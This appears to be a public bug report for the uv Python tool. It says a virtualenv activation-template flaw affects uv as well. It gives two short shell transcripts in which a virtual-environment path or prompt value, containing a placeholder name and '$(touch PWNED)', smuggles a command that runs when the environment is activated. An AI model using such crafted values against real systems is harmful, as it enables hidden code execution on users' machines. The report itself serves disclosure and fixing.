### Summary

### Summary

[CVE-2026-113776](https://www.cve.org/CVERecord?id=CVE-2026-113776) was recently disclosed for `virtualenv`, corresponding to https://github.com/pypa/virtualenv/security/advisories/GHSA-8rjx-v5ww-45pp.

> `ViaTemplateActivator.instantiate_template` replaces the placeholders in an activation template one key at a time, each across the whole text. When a value that it already substituted and quoted contains the name of a later placeholder, the later pass rewrites that name inside the quoted literal. The inserted value brings its own quotes, which close the outer literal, and the rest of the path runs as code when a user activates the environment.

Since `uv` uses activation scripts derived from `virtualenv`, I tried the proofs of concept from https://github.com/pypa/virtualenv/security/advisories/GHSA-8rjx-v5ww-45pp and was able to reproduce it, indicating that `uv` is affected by the same issue:

```
$ uv venv A__VIRTUAL_NAME__B/x'$(touch PWNED)'y
Using CPython 3.15.2 interpreter at: /usr/bin/python3
Creating virtual environment at: A__VIRTUAL_NAME__B/x$(touch PWNED)y
Activate with: source 'A__VIRTUAL_NAME__B/x$(touch PWNED)y/bin/activate'
$ ls
A__VIRTUAL_NAME__B
$ source 'A__VIRTUAL_NAME__B/x$(touch PWNED)y/bin/activate'
(xy) $ ls
A__VIRTUAL_NAME__B  PWNED
```

```
$ uv venv --prompt A__VIRTUAL_NAME__B/x'$(touch PWNED)'y
Using CPython 3.15.2 interpreter at: /usr/bin/python3
Creating virtual environment at: .venv
Activate with: source .venv/bin/activate
$ ls -a
.  ..  .venv
$ source .venv/bin/activate
(A__VIRTUAL_NAME__B/xy) $ ls
PWNED
```

It’s my understanding from previous issues like https://github.com/astral-sh/uv/issues/23059 and https://github.com/astral-sh/uv/issues/23058 that that this would not be considered a vulnerability under `uv`’s attacker and threat models, because `uv` does not expect a hostile user to control the environment or parameters with which a virtual environment is created. I am therefore reporting this as a regular public bug.

### Platform

 Fedora 45 x86_64

### Version

uv 0.13.7

### Python version

Python 3.15.2
title: virtualenv activation scripts run code from a path that contains a placeholder name
